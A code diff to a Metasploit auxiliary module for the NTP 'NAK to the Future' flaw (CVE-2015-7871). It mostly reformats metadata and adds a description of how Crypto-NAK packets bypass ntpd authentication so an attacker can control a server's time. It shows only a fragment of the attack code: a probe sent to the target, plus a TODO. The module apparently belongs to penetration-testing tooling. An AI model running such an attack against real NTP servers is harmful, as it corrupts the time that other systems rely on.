@@ -12,30 +12,39 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::NTP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'NTP "NAK To the Future"',
-      'Description'    => %q(
-        Fill.  This.  In.
-      ),
-      'Author'         =>
-        [
-          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
-          [ 'URL', 'http://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
-          [ 'URL', 'http://support.ntp.org/bin/view/Main/NtpBug2941' ],
-          [ 'CVE', '2015-7871' ]
-        ]
+    super(
+      update_info(
+        info,
+        'Name'           => 'NTP "NAK to the Future"',
+        'Description'    => %q(
+          Crypto-NAK packets can be used to cause ntpd to accept time from
+          unauthenticated ephemeral symmetric peers by bypassing the
+          authentication required to mobilize peer associations.  This module
+          sends these Crypto-NAK packets in order to establish an association
+          between the target ntpd instance and the attacking client.  The end goal
+          is to cause ntpd to declare the legitimate peers "false tickers" and
+          choose the attacking client(s) as the preferred peer(s), allowing
+          these peers to control time.
+         ),
+        'Author'         =>
+          [
+            'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
+          ],
+        'License'        => MSF_LICENSE,
+        'References'     =>
+          [
+            [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
+            [ 'URL', 'http://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
+            [ 'URL', 'http://support.ntp.org/bin/view/Main/NtpBug2941' ],
+            [ 'CVE', '2015-7871' ]
+          ]
       )
     )
 
     register_options(
-    [
-      OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300]),
-    ], self.class)
+      [
+        OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300])
+      ], self.class)
   end
 
   def scanner_process(data, shost, _sport)
@@ -63,13 +72,5 @@ class Metasploit3 < Msf::Auxiliary
     probe.payload = "\x00\x00\x00\x00"
     scanner_send(probe, ip, datastore['RPORT'])
     # TODO: whatever is next in order to let us win the race against the other peers
-  end
-
-  def scanner_prescan(batch)
-    @results = {}
-  end
-
-  def scanner_postscan(_batch)
-    # do something here...
   end
 end
